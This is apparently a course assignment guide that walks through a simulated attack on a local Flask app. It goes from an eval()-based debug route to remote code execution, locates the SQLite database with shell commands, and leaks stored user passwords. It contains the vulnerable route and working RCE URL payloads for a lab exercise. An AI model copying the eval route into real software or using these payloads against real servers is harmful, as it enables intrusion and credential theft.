# 🛠️ Simulated Attack Chain 1 Guide (Full Workflow)

This document provides a step-by-step simulation of a realistic attack chain that starts from a remote code execution (RCE) vulnerability exposed through a debug route and ends with leaking plaintext user passwords(or password hash value) stored in the SQLite database. This can be used as part of our Coursework 1: Simulate Attacks section.

## 🔗 Attack Flow Overview

```mermaid
graph TD
    A1[Access /debug endpoint with RCE] --> A2[List file system recursively]
    A2 --> A3[Identify instance/bidding.db via 'ls']
    A3 --> A4[Use simulate_attack_password_leak.py to extract credentials]
```
## ✅ Prerequisites

Flask app running locally on http://127.0.0.1:5000

A debug route enabled in app.py (for testing only!):

@app.route('/debug')
def debug():
    from flask import request
    q = request.args.get('q')
    return str(eval(q))

## 🧨 Step-by-Step Attack Simulation

### 🔍 Step 1: List server file system recursively

`http://127.0.0.1:5000/debug?q=__import__('os').popen('ls -R').read()`

This lists all folders and subfolders. Identify instance/ or other folders that may contain .db files.
![alt text](image-1.png)

### 🔍 Step 2: Search for .db files

`http://127.0.0.1:5000/debug?q=__import__('os').popen("find . -name '*.db'").read()`

Expected output:

`./instance/bidding.db`
![alt text](image.png)

### 🧪 Step 3: Run the leak script to extract plaintext passwords
Update DB_PATH in simulate_attack_password_leak.py with `instance/bidding.db`
run:
```
python simulate_attack_password_leak.py
```
You will see all usernames, emails, and plaintext passwords (because our system currently stores them insecurely).
![alt text](image-2.png)

### ✅ What to Submit (For Coursework 1 - Part 4)

Screenshots of each stage:

Directory listing via RCE

.db file identified and base64 dumped

Decoded .db file restored

Script output showing leaked user credentials
